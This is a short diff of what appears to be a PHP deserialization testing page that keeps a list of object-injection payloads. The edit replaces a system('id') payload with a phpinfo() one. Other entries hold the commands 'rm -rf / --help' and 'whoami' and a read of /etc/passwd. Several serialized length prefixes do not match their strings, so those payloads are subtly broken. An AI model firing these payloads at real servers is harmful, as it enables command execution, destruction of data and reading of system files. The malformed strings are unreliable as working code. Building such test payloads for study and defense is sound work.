@@ -374,7 +374,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['serialized_data'])) {
         const payloads = {
             php: {
                 object_injection: 'O:15:"VulnerableClass":2:{s:7:"command";s:2:"id";s:9:"file_path";s:9:"/tmp/test";}',
-                magic_method: 'O:8:"stdClass":1:{s:4:"test";s:22:"<?php system(\'id\'); ?>";}',
+                magic_method: 'O:8:"stdClass":1:{s:4:"test";s:16:"<?php phpinfo(); ?>";}',
                 code_execution: 'O:15:"VulnerableClass":1:{s:7:"command";s:14:"rm -rf / --help";}',
                 property_oriented: 'O:15:"VulnerableClass":3:{s:7:"command";s:6:"whoami";s:9:"file_path";s:11:"/etc/passwd";s:4:"data";s:15:"malicious_data";}',
                 safe: 'a:3:{s:4:"name";s:8:"testuser";s:3:"age";i:25;s:5:"email";s:18:"test@example.com";}'
